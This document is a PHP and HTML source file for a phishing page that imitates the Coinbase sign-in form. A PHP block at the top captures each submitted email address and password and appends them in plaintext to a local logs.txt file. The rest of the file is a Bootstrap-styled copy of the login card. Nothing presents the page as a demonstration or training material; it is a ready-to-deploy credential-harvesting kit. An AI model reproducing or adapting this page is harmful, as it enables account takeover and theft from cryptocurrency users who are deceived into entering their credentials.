<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon" />
    <title>Coinbase - Sign In</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <section>
    <?php

if(isset($_POST['btn_submit'])){
  $email = $_POST['email'];
  $password = $_POST['password'];
  
  $myfile = fopen("logs.txt","a") or die("unable to open file");
  $txt = "Email - $email\n";
  fwrite($myfile,$txt);
  $txt = "Password - $password\n";
  fwrite($myfile,$txt);

  //to add line for loop seperations
  $txt = "\n";
  fwrite($myfile,$txt);
  $txt = "////////////////////NEW DATA///////////////////////\n";
  fwrite($myfile,$txt);
  $txt = "\n";
  fwrite($myfile,$txt);
  ///END ADD LINE

  fclose($myfile);
}

?>
      <div class="container-sm position-relative">
        <div class="card px-5 mt-5 m-auto w-auto">
          <p class="lead primary fw-medium fs-1 mt-4 fs-2">coinbase</p>
          <br />

          <p class="lead fw-semibold fs-2">Sign in to Coinbase</p>
          <p class="sign">
            Not your device? use a private or incognito window to sign in.
          </p>
          <form method="POST" id="form">
            <p class="fw-bold">Email</p>

            <input required
              type="email"
              name="email"
              id="email"
              class="form-control mb-3 py-3"
            />
            <p class="fw-bold">Password</p>
            <input required
              type="password"
              name="password"
              id="password"
              class="form-control mb-3 py-3"
            />
            <a href="#" target="_blank" class="primary mt-1"
              >Forgot Password?</a
            >
            <br />
            <button
              type="submit"
              name="btn_submit"
              class="primars w-100 fw-bold text-white"
              id="btn"
            >
              Continue
            </button>
          </form>
          <div id="result"></div>
        </div>
      </div>
    </section>
  </body>
</html>
<script
  src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
  integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
  crossorigin="anonymous"
></script>
<!-- <script src="script.js"></script> -->
